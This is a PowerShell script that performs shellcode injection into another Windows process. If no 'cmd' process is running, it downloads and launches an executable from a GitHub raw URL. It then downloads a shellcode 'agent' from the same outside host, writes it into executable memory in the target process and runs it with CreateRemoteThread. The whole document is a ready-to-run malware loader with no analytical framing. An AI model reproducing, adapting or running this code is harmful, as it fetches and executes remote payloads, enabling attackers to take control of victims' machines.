# === Step 1: Locate a Candidate Process ===
$targetProcess = Get-Process -Name "cmd" -ErrorAction SilentlyContinue | Select-Object -First 1

if (!$targetProcess) {
    Write-Host "No running 32-bit 'cmd' process found. Downloading and launching test application..."
    
    # Download test application (main.exe) from GitHub
    $testAppUrl = "https://raw.githubusercontent.com/Magturn/Bat/main/main.exe"
    $tempPath = "$env:TEMP\main.exe"
    Invoke-WebRequest -Uri $testAppUrl -OutFile $tempPath
    Write-Host "Test app downloaded to $tempPath. Launching..."
    
    # Start the test application and wait for it to initialize
    Start-Process -FilePath $tempPath
    Start-Sleep -Seconds 3

    # Now look for the process by name (the process name will be "main")
    $targetProcess = Get-Process -Name "main" -ErrorAction SilentlyContinue | Select-Object -First 1
    if (!$targetProcess) {
        Write-Host "Failed to start or locate the test process." -ForegroundColor Red
        exit
    }
}
$targetPID = $targetProcess.Id
Write-Host "Using target process with PID: $targetPID"

# === Step 2: Download Shellcode (Agent) ===
$agentUrl = "https://raw.githubusercontent.com/Magturn/Bat/main/winner.bin"
Write-Host "Downloading shellcode from $agentUrl..."
$wc = New-Object System.Net.WebClient
$shellcode = $wc.DownloadData($agentUrl)
Write-Host "Shellcode downloaded: $($shellcode.Length) bytes."

# === Step 3: Define Win32 API Functions via Add-Type ===
$signature = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@
Add-Type $signature

# === Step 4: Define Constants and Open Target Process ===
$PROCESS_ALL_ACCESS    = 0x1F0FFF
$MEM_COMMIT            = 0x1000
$MEM_RESERVE           = 0x2000
$PAGE_EXECUTE_READWRITE= 0x40

$hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $targetPID)
if ($hProcess -eq [IntPtr]::Zero) {
    Write-Host "Failed to open target process." -ForegroundColor Red
    exit
}
Write-Host "Target process opened successfully."

# === Step 5: Allocate Memory in the Target Process ===
$size = $shellcode.Length
$allocAddress = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $size, ($MEM_COMMIT -bor $MEM_RESERVE), $PAGE_EXECUTE_READWRITE)
if ($allocAddress -eq [IntPtr]::Zero) {
    Write-Host "Memory allocation failed." -ForegroundColor Red
    [Win32]::CloseHandle($hProcess)
    exit
}
Write-Host ("Allocated {0} bytes at address {1}" -f $size, $allocAddress)

# === Step 6: Write Shellcode into the Allocated Memory ===
[int]$bytesWritten = 0
$result = [Win32]::WriteProcessMemory($hProcess, $allocAddress, $shellcode, $shellcode.Length, [ref]$bytesWritten)
if (-not $result -or $bytesWritten -ne $shellcode.Length) {
    Write-Host "Failed to write shellcode to target process memory." -ForegroundColor Red
    [Win32]::CloseHandle($hProcess)
    exit
}
Write-Host "Shellcode written successfully to target process memory."

# === Step 7: Create a Remote Thread to Execute the Shellcode ===
$threadHandle = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $allocAddress, [IntPtr]::Zero, 0, [IntPtr]::Zero)
if ($threadHandle -eq [IntPtr]::Zero) {
    Write-Host "Failed to create remote thread." -ForegroundColor Red
    [Win32]::CloseHandle($hProcess)
    exit
}
Write-Host "Remote thread created. Shellcode injected and executing!"

# === Step 8: Clean Up ===
[Win32]::CloseHandle($hProcess)
